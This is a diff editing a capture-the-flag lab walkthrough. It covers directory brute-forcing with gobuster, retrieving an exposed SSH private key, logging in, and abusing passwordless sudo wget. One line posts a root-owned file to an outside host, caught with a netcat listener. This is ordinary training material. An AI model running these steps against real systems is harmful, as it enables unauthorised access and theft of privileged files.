@@ -36,7 +36,7 @@ gobuster dir -u http://<IP>/sitemap/ -w /usr/share/wordlists/dirb/common.txt
 ```
 Discovered:
 ```
-/id_rsa
+/.ssh
 ```
 
 ---
@@ -44,7 +44,7 @@ Discovered:
 ### 5️⃣ Retrieving the SSH Key
 Downloaded the SSH private key from:
 ```
-http://<IP>/sitemap/id_rsa
+http://<IP>/sitemap/.ssh
 ```
 Fixed key permissions:
 ```bash
@@ -60,7 +60,7 @@ ssh -i id_rsa <username>@<IP>
 ```
 After successful login, retrieved the **user flag**:
 ```bash
-cat user.txt
+cat user_flag.txt
 ```
 
 ---
@@ -77,11 +77,11 @@ Found that **wget** can be run as root without a password.
 ### 8️⃣ Exfiltrating the Root Flag
 Used `wget` to send the root flag to my local machine:
 ```bash
-sudo /usr/bin/wget --post-file=/root/root.txt http://<your-ip>:<port>
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<your-ip>:<port>
 ```
-On attacker machine, started a Python HTTP server to receive the file:
+On my machine, started a netcat to receive the file:
 ```bash
-python3 -m http.server 4444
+nc -nvlp 4444
 ```
 **Root flag received!** 🏆
 
